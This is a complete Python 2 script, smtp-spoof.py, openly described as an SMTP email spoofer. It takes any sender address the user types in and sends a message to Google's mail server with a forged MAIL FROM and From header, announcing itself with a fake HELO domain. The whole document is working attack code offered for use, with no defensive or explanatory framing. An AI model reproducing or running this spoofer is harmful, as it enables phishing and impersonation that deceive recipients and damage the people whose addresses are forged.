#!/usr/bin/env python

#	smtp-spoof.py
#	A basic SMTP email spoofer.
#	Author: William Woodruff
#	This code is licensed by William Woodruff under the MIT License.
#	http://opensource.org/licenses/MIT

import sys
import socket
import time

from_address = raw_input("\"Sender\": ")
to_address = raw_input("Recipient: ")
subject = raw_input("Subject: ")
acc = []
print "##### Complete message with EOF (^D) #####"
message = sys.stdin.read()
time = time.strftime("%a, %d %b %Y %H:%M:%S -0500", time.localtime())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("aspmx.l.google.com", 25))
sock.recv(1024)
sock.sendall("HELO notreal.com\r\n")
sock.recv(1024)
sock.sendall("MAIL FROM:<" + from_address + ">\r\n")
sock.recv(1024)
sock.sendall("RCPT TO:<" + to_address + ">\r\n")
sock.recv(1024)
sock.sendall("DATA\r\n")
sock.sendall("From: \"" + from_address + "\" <" + from_address + ">\r\n")
sock.sendall("To: \"" + to_address + "\" <" + to_address + ">\r\n")
sock.sendall("Date: " + time + "\r\n")
sock.sendall("Subject: " + subject + "\r\n")
sock.sendall(message + "\r\n")
sock.sendall(".\r\n")
sock.recv(1024)
sock.sendall("QUIT\r\n")
sock.close()